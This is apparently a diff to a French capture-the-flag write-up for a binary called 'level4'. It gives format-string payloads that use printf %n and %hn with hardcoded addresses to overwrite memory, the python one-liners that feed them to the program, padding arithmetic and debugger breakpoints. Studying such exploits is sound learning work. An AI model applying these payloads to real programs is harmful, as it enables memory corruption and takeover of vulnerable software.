@@ -28,7 +28,7 @@ Il s'avère que l'adresse se situe à la 4ème position dans la stack :
 
 Shellcode finale :
 
-    \x10\x98\x04\x08%60x%1$n
+    \x10\x98\x04\x08%60x%2$n 
     \x10\x98\x04\x08\x12\x98\x04\x08%21820x%1$hn%250x%2$hn
 
 
@@ -40,6 +40,8 @@ Correspond à la valeur 64 qu'on veut écrire à l'adresse 0x804988c. On enleve 
 %n de printf permet d'écrire de la data à l'ènième adresse indiqué par '<valeur>$'
 
 Procédure finale :
+
+    run < <(python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%47798x%1$hn%4160x%2$hn"')
 
     python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%21820x%1$hn%250x%2$hn"' > /tmp/inject
     cat /tmp/inject - | ./level4
@@ -65,5 +67,7 @@ Ecriture :
 21828 - 8 = 21820
 258 - 8 = 250
 
+b *p+12
+b *n+54
 
 
